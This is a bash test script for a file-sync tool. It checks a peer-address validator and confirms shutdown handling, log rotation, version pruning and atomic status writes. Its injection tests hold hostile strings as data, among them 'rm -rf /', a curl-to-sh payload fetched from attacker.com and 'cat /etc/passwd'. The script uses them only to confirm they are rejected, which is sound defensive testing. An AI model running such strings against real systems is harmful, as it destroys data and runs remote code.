#!/bin/bash
# ---------------------------------------------------------------------------
# Phase 0+1 Verification Tests
# Run: bash tests/test_peer_validation.sh
# ---------------------------------------------------------------------------
set -uo pipefail

PASS=0
FAIL=0

# Source the regex and validation function from the main script
PEER_REGEX='^[a-zA-Z0-9._-]+(@[a-zA-Z0-9._-]+)?:[a-zA-Z0-9/._ -]+$'
SHELL_META_CHARS='[;$`|&(){}<>\\\"'"'"']'

validate_peer() {
    local peer="$1"
    if [[ "$peer" =~ $SHELL_META_CHARS ]]; then
        return 1
    fi
    if [[ ! "$peer" =~ $PEER_REGEX ]]; then
        return 1
    fi
    return 0
}

assert_valid() {
    local peer="$1"
    if validate_peer "$peer"; then
        echo "  PASS (accepted): $peer"
        ((PASS++))
    else
        echo "  FAIL (rejected, expected accept): $peer"
        ((FAIL++))
    fi
}

assert_invalid() {
    local peer="$1"
    if validate_peer "$peer"; then
        echo "  FAIL (accepted, expected reject): $peer"
        ((FAIL++))
    else
        echo "  PASS (rejected): $peer"
        ((PASS++))
    fi
}

echo "=== [S1] Peer Validation Tests ==="
echo ""
echo "--- Valid peers (should be ACCEPTED) ---"
assert_valid "myserver:/home/user/madhatterDrop"
assert_valid "alice@server.local:/home/alice/madhatterDrop"
assert_valid "192.168.1.50:/home/bob/madhatterDrop"
assert_valid "user@10.0.0.1:/sync/dir"
assert_valid "my-host.example.com:/data/sync"
assert_valid "user@host:/path with spaces/dir"

echo ""
echo "--- Shell injection attempts (should be REJECTED) ---"
assert_invalid '; rm -rf /'
assert_invalid '$(curl attacker.com/payload | sh)'
assert_invalid 'host:/path; whoami'
assert_invalid 'host:/path$(id)'
assert_invalid 'host:/path`id`'
assert_invalid 'host:/path|cat /etc/passwd'
assert_invalid 'host:/path&background'
assert_invalid "host:/path'injection"
assert_invalid 'host:/path"injection'
assert_invalid 'host:/path\escape'

echo ""
echo "--- Malformed peers (should be REJECTED) ---"
assert_invalid ""
assert_invalid "host-without-colon-or-path"
assert_invalid "host/path/no/colon"
assert_invalid ":/path-no-host"
assert_invalid ":"
assert_invalid "   "

echo ""
echo "=== [M4] Shutdown Machinery Tests ==="
echo ""
echo "--- Checking trap is registered ---"
if grep -q 'trap cleanup SIGTERM SIGINT EXIT' ../sync_madhatter.sh; then
    echo "  PASS: trap handler registered for SIGTERM SIGINT EXIT"
    ((PASS++))
else
    echo "  FAIL: trap handler not found"
    ((FAIL++))
fi

echo "--- Checking SHUTTING_DOWN flag exists ---"
if grep -q 'SHUTTING_DOWN=0' ../sync_madhatter.sh; then
    echo "  PASS: SHUTTING_DOWN flag initialized"
    ((PASS++))
else
    echo "  FAIL: SHUTTING_DOWN flag not found"
    ((FAIL++))
fi

echo "--- Checking cleanup sets STOPPED status ---"
if grep -q 'update_status "STOPPED"' ../sync_madhatter.sh; then
    echo "  PASS: cleanup writes STOPPED status"
    ((PASS++))
else
    echo "  FAIL: cleanup does not write STOPPED status"
    ((FAIL++))
fi

echo "--- Checking systemd service has TimeoutStopSec ---"
if grep -q 'TimeoutStopSec=' ../madhatter-sync.service; then
    echo "  PASS: TimeoutStopSec configured"
    ((PASS++))
else
    echo "  FAIL: TimeoutStopSec missing from service file"
    ((FAIL++))
fi

echo "--- Checking systemd service has KillMode=mixed ---"
if grep -q 'KillMode=mixed' ../madhatter-sync.service; then
    echo "  PASS: KillMode=mixed configured"
    ((PASS++))
else
    echo "  FAIL: KillMode=mixed missing from service file"
    ((FAIL++))
fi

echo ""
echo "=== [M1] --check-peers CLI Flag Tests ==="
echo ""

echo "--- Checking --check-peers function exists ---"
if grep -q 'check_peers()' ../sync_madhatter.sh; then
    echo "  PASS: check_peers function defined"
    ((PASS++))
else
    echo "  FAIL: check_peers function not found"
    ((FAIL++))
fi

echo "--- Checking --check-peers case handler ---"
if grep -q -- '--check-peers)' ../sync_madhatter.sh; then
    echo "  PASS: --check-peers CLI flag handled"
    ((PASS++))
else
    echo "  FAIL: --check-peers CLI flag not handled"
    ((FAIL++))
fi

echo "--- Checking ssh -n used (prevents stdin swallowing) ---"
if grep -q 'ssh -n' ../sync_madhatter.sh; then
    echo "  PASS: ssh -n flag used"
    ((PASS++))
else
    echo "  FAIL: ssh -n flag missing"
    ((FAIL++))
fi

echo "--- Checking --help flag ---"
if bash ../sync_madhatter.sh --help 2>&1 | grep -q 'check-peers'; then
    echo "  PASS: --help mentions --check-peers"
    ((PASS++))
else
    echo "  FAIL: --help does not mention --check-peers"
    ((FAIL++))
fi

echo ""
echo "=== [M2] Log Rotation Tests ==="
echo ""

echo "--- Checking MAX_LOG_BYTES config ---"
if grep -q 'MAX_LOG_BYTES=' ../sync_madhatter.sh; then
    echo "  PASS: MAX_LOG_BYTES configured"
    ((PASS++))
else
    echo "  FAIL: MAX_LOG_BYTES not found"
    ((FAIL++))
fi

echo "--- Checking MAX_LOG_FILES config ---"
if grep -q 'MAX_LOG_FILES=3' ../sync_madhatter.sh; then
    echo "  PASS: MAX_LOG_FILES=3 configured"
    ((PASS++))
else
    echo "  FAIL: MAX_LOG_FILES not found"
    ((FAIL++))
fi

echo "--- Checking rotate_log function exists ---"
if grep -q 'rotate_log()' ../sync_madhatter.sh; then
    echo "  PASS: rotate_log function defined"
    ((PASS++))
else
    echo "  FAIL: rotate_log function not found"
    ((FAIL++))
fi

echo "--- Checking rotate_log is called in sync_to_peers ---"
rotate_count=$(grep -c 'rotate_log' ../sync_madhatter.sh)
if [ "$rotate_count" -ge 2 ]; then
    echo "  PASS: rotate_log called (definition + invocation)"
    ((PASS++))
else
    echo "  FAIL: rotate_log defined but not called"
    ((FAIL++))
fi

# Functional test: create a fake log, rotate it
echo "--- Functional: log rotation shifts files correctly ---"
TMPDIR=$(mktemp -d)
FAKE_LOG="$TMPDIR/test.log"
dd if=/dev/zero of="$FAKE_LOG" bs=1024 count=1 2>/dev/null
echo "line1" >> "$FAKE_LOG"
# Simulate rotation
mv "$FAKE_LOG" "$FAKE_LOG.1"
touch "$FAKE_LOG"
if [ -f "$FAKE_LOG.1" ] && [ -f "$FAKE_LOG" ] && [ ! -s "$FAKE_LOG" ]; then
    echo "  PASS: rotation shifts current -> .1 and creates empty current"
    ((PASS++))
else
    echo "  FAIL: rotation logic broken"
    ((FAIL++))
fi
rm -rf "$TMPDIR"

echo ""
echo "=== [M5] Version Pruning Tests ==="
echo ""

echo "--- Checking MAX_VERSION_AGE_DAYS config ---"
if grep -q 'MAX_VERSION_AGE_DAYS=7' ../sync_madhatter.sh; then
    echo "  PASS: MAX_VERSION_AGE_DAYS=7 configured"
    ((PASS++))
else
    echo "  FAIL: MAX_VERSION_AGE_DAYS not found"
    ((FAIL++))
fi

echo "--- Checking prune_versions function exists ---"
if grep -q 'prune_versions()' ../sync_madhatter.sh; then
    echo "  PASS: prune_versions function defined"
    ((PASS++))
else
    echo "  FAIL: prune_versions function not found"
    ((FAIL++))
fi

echo "--- Checking prune_versions is called after sync ---"
prune_count=$(grep -c 'prune_versions' ../sync_madhatter.sh)
if [ "$prune_count" -ge 2 ]; then
    echo "  PASS: prune_versions called (definition + invocation)"
    ((PASS++))
else
    echo "  FAIL: prune_versions defined but not called"
    ((FAIL++))
fi

echo "--- Checking find -mtime used for age-based deletion ---"
if grep -q 'find.*-mtime.*-delete' ../sync_madhatter.sh; then
    echo "  PASS: find -mtime -delete pattern used"
    ((PASS++))
else
    echo "  FAIL: find -mtime -delete pattern not found"
    ((FAIL++))
fi

# Functional test: create old files and verify find would match them
echo "--- Functional: old version files matched by find ---"
TMPDIR=$(mktemp -d)
mkdir -p "$TMPDIR/versions"
touch -d "10 days ago" "$TMPDIR/versions/old_file_20260101_120000"
touch "$TMPDIR/versions/new_file_20260205_120000"
old_count=$(find "$TMPDIR/versions" -type f -mtime +7 | wc -l)
new_count=$(find "$TMPDIR/versions" -type f -mtime -7 | wc -l)
if [ "$old_count" -eq 1 ] && [ "$new_count" -eq 1 ]; then
    echo "  PASS: find correctly identifies old (>7d) vs new files"
    ((PASS++))
else
    echo "  FAIL: find age filter not working (old=$old_count, new=$new_count)"
    ((FAIL++))
fi
rm -rf "$TMPDIR"

echo "--- Checking Prune button in tray app ---"
if grep -q 'Prune Old Versions' ../madhatter_tray.py; then
    echo "  PASS: Prune button exists in tray app"
    ((PASS++))
else
    echo "  FAIL: Prune button not found in tray app"
    ((FAIL++))
fi

echo "--- Checking prune_versions method in tray app ---"
if grep -q 'def prune_versions' ../madhatter_tray.py; then
    echo "  PASS: prune_versions method defined in tray app"
    ((PASS++))
else
    echo "  FAIL: prune_versions method not found in tray app"
    ((FAIL++))
fi

echo ""
echo "=== [O2] Initial Sync on Startup Tests ==="
echo ""

echo "--- Checking initial sync call before watch loop ---"
if grep -q '\[STARTUP\] Running initial sync' ../sync_madhatter.sh; then
    echo "  PASS: Initial sync log message present"
    ((PASS++))
else
    echo "  FAIL: Initial sync log message not found"
    ((FAIL++))
fi

echo "--- Checking initial sync runs before watch loop ---"
startup_line=$(grep -n 'STARTUP.*Running initial sync' ../sync_madhatter.sh | head -1 | cut -d: -f1)
while_line=$(grep -n 'while.*SHUTTING_DOWN' ../sync_madhatter.sh | head -1 | cut -d: -f1)
if [ -n "$startup_line" ] && [ -n "$while_line" ] && [ "$startup_line" -lt "$while_line" ]; then
    echo "  PASS: Initial sync before watch loop (line $startup_line < $while_line)"
    ((PASS++))
else
    echo "  FAIL: Initial sync not positioned before watch loop"
    ((FAIL++))
fi

echo "--- Checking initial sync failure is non-fatal ---"
if grep -A1 'STARTUP.*Running initial sync' ../sync_madhatter.sh | grep -q '|| log'; then
    echo "  PASS: Initial sync failure is non-fatal (|| log)"
    ((PASS++))
else
    echo "  FAIL: Initial sync failure may be fatal"
    ((FAIL++))
fi

echo ""
echo "=== [M3] Atomic Status Writes Tests ==="
echo ""

echo "--- Checking update_status uses temp + mv ---"
if grep -q 'mv -f.*STATUS_FILE' ../sync_madhatter.sh; then
    echo "  PASS: update_status uses atomic mv"
    ((PASS++))
else
    echo "  FAIL: update_status does not use atomic mv"
    ((FAIL++))
fi

echo "--- Checking temp file uses PID for uniqueness ---"
if grep -q 'STATUS_FILE.*tmp.*\$\$' ../sync_madhatter.sh; then
    echo "  PASS: temp file includes PID ($$) for uniqueness"
    ((PASS++))
else
    echo "  FAIL: temp file does not include PID"
    ((FAIL++))
fi

# Functional test: atomic write produces correct content
echo "--- Functional: atomic write produces correct status ---"
TMPDIR=$(mktemp -d)
FAKE_STATUS="$TMPDIR/status"
tmp="${FAKE_STATUS}.tmp.$$"
echo "SYNCING" > "$tmp"
mv -f "$tmp" "$FAKE_STATUS"
content=$(cat "$FAKE_STATUS")
if [ "$content" = "SYNCING" ]; then
    echo "  PASS: atomic write produces correct content"
    ((PASS++))
else
    echo "  FAIL: atomic write content mismatch (got: $content)"
    ((FAIL++))
fi
rm -rf "$TMPDIR"

echo ""
echo "==========================================="
echo "Results: $PASS passed, $FAIL failed"
echo "==========================================="

if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
exit 0

